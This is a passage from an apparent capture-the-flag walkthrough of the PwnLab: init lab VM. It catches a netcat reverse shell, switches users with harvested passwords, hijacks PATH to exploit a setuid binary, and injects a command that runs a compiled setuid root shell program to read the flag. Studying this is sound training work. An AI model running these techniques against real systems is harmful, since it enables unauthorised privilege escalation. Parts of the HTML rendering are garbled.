<p>The following response proved that the LFI vulnerability exists and works:</p>

<p><img class="left" src="/downloads/pwnlab_init/3.png"></p>

<p>Now I set up <code>NC</code> to listen on port 443 and then trigger the shell to connect back.</p>

<p><img class="left" src="/downloads/pwnlab_init/4.png"></p>

<p>Great! got in~</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/pwnlab_init# nc -lvnp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>connect to <span class="o">[</span>10.1.1.132<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.140<span class="o">]</span> 51503
</span><span class='line'>Linux pwnlab 3.16.0-4-686-pae <span class="c">#1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) i686 GNU/Linux</span>
</span><span class='line'> 08:21:09 up <span class="m">1</span> day, 23:06,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span><span class='line'><span class="nv">$ </span>ls -al home
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x  <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 .
</span><span class='line'>drwxr-xr-x <span class="m">21</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 09:13 ..
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> john john <span class="m">4096</span> Mar <span class="m">17</span> 09:57 john
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> kane kane <span class="m">4096</span> Mar <span class="m">17</span> 13:04 kane
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> kent kent <span class="m">4096</span> Mar <span class="m">17</span> 10:06 kent
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> mike mike <span class="m">4096</span> Mar <span class="m">17</span> 15:19 mike
</span><span class='line'><span class="nv">$ </span>ifconfig
</span><span class='line'>eth0      Link encap:Ethernet  HWaddr 00:0c:29:11:ce:27&lt;br/&gt;
</span><span class='line'>          inet addr:10.1.1.140  Bcast:10.1.1.255  Mask:255.255.255.0
</span><span class='line'>          inet6 addr: fe80::20c:29ff:fe11:ce27/64 Scope:Link
</span><span class='line'>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span><span class='line'>          RX packets:150222 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:75016 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:1000
</span><span class='line'>          RX bytes:11602121 <span class="o">(</span>11.0 MiB<span class="o">)</span>  TX bytes:8154028 <span class="o">(</span>7.7 MiB<span class="o">)</span>
</span><span class='line'>          Interrupt:19 Base address:0x2000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;lo        Link encap:Local Loopback&lt;br/&gt;
</span><span class='line'>          inet addr:127.0.0.1  Mask:255.0.0.0
</span><span class='line'>          inet6 addr: ::1/128 Scope:Host
</span><span class='line'>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
</span><span class='line'>          RX packets:2 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:2 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:0
</span><span class='line'>          RX bytes:100 <span class="o">(</span>100.0 B<span class="o">)</span>  TX bytes:100 <span class="o">(</span>100.0 B<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>During the enumeration phase, I tried the user creditionals collected from the previouse steps:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>www-data@pwnlab:/tmp<span class="nv">$ </span>su mike
</span><span class='line'>su mike
</span><span class='line'>Password: SIfdsTEn6I&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;su: Authentication failure
</span><span class='line'>www-data@pwnlab:/tmp<span class="nv">$ </span>su kent
</span><span class='line'>su kent
</span><span class='line'>Password: JWzXuBJJNy&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;kent@pwnlab:/tmp<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>kent<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>kent<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>kent<span class="o">)</span>
</span><span class='line'>kent@pwnlab:/tmp<span class="nv">$ </span><span class="nb">cd</span> /home/kent
</span><span class='line'><span class="nb">cd</span> /home/kent
</span><span class='line'>kent@pwnlab:~<span class="nv">$ </span>ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 20
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> kent kent <span class="m">4096</span> Mar <span class="m">17</span> 10:06 .
</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kent kent  <span class="m">220</span> Mar <span class="m">17</span> 10:06 .bash_logout
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kent kent <span class="m">3515</span> Mar <span class="m">17</span> 10:06 .bashrc
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kent kent  <span class="m">675</span> Mar <span class="m">17</span> 10:06 .profile
</span><span class='line'>kent@pwnlab:~<span class="nv">$ </span>sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>bash: sudo: <span class="nb">command </span>not found&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;kent@pwnlab:/<span class="nv">$ </span>su kane
</span><span class='line'>su kane
</span><span class='line'>Password: iSv5Ym2GRo&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;kane@pwnlab:/<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>kane<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>kane<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>kane<span class="o">)</span>
</span><span class='line'>kane@pwnlab:/<span class="nv">$ </span><span class="nb">cd</span> /home/kane
</span><span class='line'><span class="nb">cd</span> /home/kane
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span>ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 28
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> kane kane <span class="m">4096</span> Mar <span class="m">17</span> 13:04 .
</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kane kane  <span class="m">220</span> Mar <span class="m">17</span> 10:09 .bash_logout
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kane kane <span class="m">3515</span> Mar <span class="m">17</span> 10:09 .bashrc
</span><span class='line'>-rwsr-sr-x <span class="m">1</span> mike mike <span class="m">5148</span> Mar <span class="m">17</span> 13:04 msgmike
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kane kane  <span class="m">675</span> Mar <span class="m">17</span> 10:09 .profile
</span><span class='line'>kane@pwnlab:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Both <code>kent</code> and <code>kane</code> can be logged in successfully, but there is interesting file under kane&rsquo;s home directory, <code>msgmike</code> which the <code>setuid</code> bit is set.</p>

<p>By running <code>msgmike</code>, I found it will call system commaned <code>cat</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>kane@pwnlab:~<span class="nv">$ </span>./msgmike
</span><span class='line'>./msgmike
</span><span class='line'>cat: /home/mike/msg.txt: No such file or directory
</span></code></pre></td></tr></table></div></figure></p>

<p>In order to escape to <code>mike</code>, I create a executable file <code>cat</code> under the local directory and set the environmental variable <code>PATH</code> to include <code>.</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'> &lt;br/&gt;
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>
</span><span class='line'><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>.:<span class="nv">$PATH</span>
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
</span><span class='line'><span class="nb">echo</span> <span class="nv">$PATH</span>
</span><span class='line'>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span><span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>/bin/bash<span class="p">&amp;</span>rdquo<span class="p">;</span> &gt; cat
</span><span class='line'><span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>/bin/bash<span class="p">&amp;</span>rdquo<span class="p">;</span> &gt; cat
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span>chmod +x cat
</span><span class='line'>chmod +x cat
</span><span class='line'>kane@pwnlab:~<span class="nv">$ </span>ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 32
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> kane kane <span class="m">4096</span> Aug <span class="m">24</span> 08:49 .
</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kane kane  <span class="m">220</span> Mar <span class="m">17</span> 10:09 .bash_logout
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kane kane <span class="m">3515</span> Mar <span class="m">17</span> 10:09 .bashrc
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> kane kane   <span class="m">10</span> Aug <span class="m">24</span> 08:49 cat
</span><span class='line'>-rwsr-sr-x <span class="m">1</span> mike mike <span class="m">5148</span> Mar <span class="m">17</span> 13:04 msgmike
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> kane kane  <span class="m">675</span> Mar <span class="m">17</span> 10:09 .profile
</span></code></pre></td></tr></table></div></figure></p>

<p>Then run the <code>./msgmike</code> to escape to user <code>mike</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>kane@pwnlab:~<span class="nv">$ </span>./msgmike
</span><span class='line'>./msgmike
</span><span class='line'>mike@pwnlab:~<span class="nv">$ </span>id
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>
</span><span class='line'>mike@pwnlab:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After promoted to <code>mike</code>, I found another <code>setuid</code> bit set file <code>msg2root</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 28
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> mike mike <span class="m">4096</span> Mar <span class="m">17</span> 15:19 .
</span><span class='line'>drwxr-xr-x <span class="m">6</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 10:09 ..
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> mike mike  <span class="m">220</span> Mar <span class="m">17</span> 10:08 .bash_logout
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> mike mike <span class="m">3515</span> Mar <span class="m">17</span> 10:08 .bashrc
</span><span class='line'>-rwsr-sr-x <span class="m">1</span> root root <span class="m">5364</span> Mar <span class="m">17</span> 13:07 msg2root
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> mike mike  <span class="m">675</span> Mar <span class="m">17</span> 10:08 .profile
</span><span class='line'>mike@pwnlab:/home/mike<span class="err">$</span>
</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>./msg2root
</span><span class='line'>./msg2root
</span><span class='line'>Message <span class="k">for</span> root: <span class="nb">test</span><span class="p">;</span> id
</span><span class='line'><span class="nb">test</span><span class="p">;</span> id
</span><span class='line'><span class="nb">test</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>
</span><span class='line'>mike@pwnlab:/home/mike<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Also I noticed that command injection vulnerability exists.</p>

<p>Then I upload <code>setuid.c</code> file to target server and compile it.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/var/www/html/privesc# cat setuid.c&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;include <span class="p">&amp;</span>lt<span class="p">;</span>stdio.h&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;include <span class="p">&amp;</span>lt<span class="p">;</span>stdlib.h&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;include <span class="p">&amp;</span>lt<span class="p">;</span>sys/types.h&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;include <span class="p">&amp;</span>lt<span class="p">;</span>unistd.h&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;int main<span class="o">()</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'> setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
</span><span class='line'> system<span class="o">(</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>/bin/sh -i<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After compiled <code>setuid.c</code> and run it as injected command to get ROOT.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>gcc -o setuid setuid.c
</span><span class='line'>gcc -o setuid setuid.c
</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>ls
</span><span class='line'>ls
</span><span class='line'>boot2root  msg2root  setuid  setuid.c
</span><span class='line'>mike@pwnlab:/home/mike<span class="nv">$ </span>./msg2root
</span><span class='line'>./msg2root
</span><span class='line'>Message <span class="k">for</span> root: id<span class="p">;</span> ./setuid
</span><span class='line'>id<span class="p">;</span> ./setuid
</span><span class='line'>id&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;id&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>mike<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1003<span class="o">(</span>kane<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Cool, got ROOT!!</p>

<p>Time to get FLAG!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;cd /root&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cd /root&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;ls -al&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;ls -al
</span><span class='line'>total 20
</span><span class='line'>drwx<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>  <span class="m">2</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 15:17 .
</span><span class='line'>drwxr-xr-x <span class="m">21</span> root root <span class="m">4096</span> Mar <span class="m">17</span> 09:13 ..
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">17</span> 10:06 .bash_history -&gt; /dev/null
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root  <span class="m">570</span> Jan <span class="m">31</span>  <span class="m">2010</span> .bashrc
</span><span class='line'><span class="p">&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;</span>-  <span class="m">1</span> root root <span class="m">1840</span> Mar <span class="m">17</span> 15:17 flag.txt
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">17</span> 13:10 messages.txt -&gt; /dev/null
</span><span class='line'>lrwxrwxrwx  <span class="m">1</span> root root    <span class="m">9</span> Mar <span class="m">17</span> 13:10 .mysql_history -&gt; /dev/null
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span>  <span class="m">1</span> root root  <span class="m">140</span> Nov <span class="m">19</span>  <span class="m">2007</span> .profile&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;cat flag.txt&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cat flag.txt
</span><span class='line'>.-<span class="o">=</span>~<span class="o">=</span>-.                                                                 .-<span class="o">=</span>~<span class="o">=</span>-.
</span><span class='line'><span class="o">(</span>&lt;strong&gt;  &lt;em&gt;<span class="o">)</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">=</span>-.&lt;em&gt;.-<span class="o">=</span>-.&lt;/em&gt;.-<span class="o">(</span>&lt;/strong&gt;  &lt;em&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;/em&gt; &lt;strong&gt;&lt;em&gt;<span class="o">)</span>  &lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;                             _                            <span class="o">(</span>&lt;em&gt; &lt;/em&gt;&lt;/strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;strong&gt;  _<span class="o">)</span> /  &lt;/strong&gt; <span class="se">\ </span>                          <span class="p">|</span> <span class="p">|</span>                           <span class="o">(</span>&lt;strong&gt;  _<span class="o">)</span>
</span><span class='line'><span class="o">(</span> _ &lt;/strong&gt;<span class="o">)</span> <span class="p">|</span> /  <span class="se">\/</span> &lt;em&gt;&lt;strong&gt;  _ &lt;/strong&gt;   &lt;strong&gt; _ _ &lt;/strong&gt; __ &lt;/em&gt;<span class="p">|</span> <span class="p">|</span>&lt;em&gt; &lt;/em&gt;&lt;strong&gt;                      <span class="o">(</span> _ &lt;/strong&gt;<span class="o">)</span>
</span><span class='line'><span class="o">(</span>&lt;strong&gt;  &lt;em&gt;<span class="o">)</span> <span class="p">|</span> <span class="p">|</span>    / _ <span class="p">|</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;/em&gt; <span class="se">\ </span>/ _&lt;code&gt;<span class="p">|</span> <span class="s1">&#39;__/ _&lt;/code&gt; | &lt;/strong&gt;/ &lt;strong&gt;|                     (&lt;/strong&gt;  &lt;em&gt;)</span>
</span><span class='line'><span class="s1">(&lt;/em&gt; &lt;strong&gt;&lt;em&gt;) | _&lt;/em&gt;/\ (&lt;em&gt;) | | | | (&lt;/em&gt;| | | | (&lt;em&gt;| | |&lt;/em&gt;_&lt;em&gt; \                     (&lt;/em&gt; &lt;/strong&gt;&lt;em&gt;)</span>
</span><span class='line'><span class="s1">(__  &lt;/em&gt;)  _&lt;em&gt;&lt;strong&gt;/_&lt;/strong&gt;/|&lt;/em&gt;| |&lt;em&gt;|_&lt;/em&gt;, |&lt;em&gt;|  _&lt;/em&gt;,&lt;em&gt;|_&lt;/em&gt;|&lt;em&gt;&lt;strong&gt;/                     (&lt;/strong&gt;  &lt;/em&gt;)</span>
</span><span class='line'><span class="s1">( _ &lt;strong&gt;)                     &lt;/strong&gt;/ |                                       ( _ &lt;strong&gt;)</span>
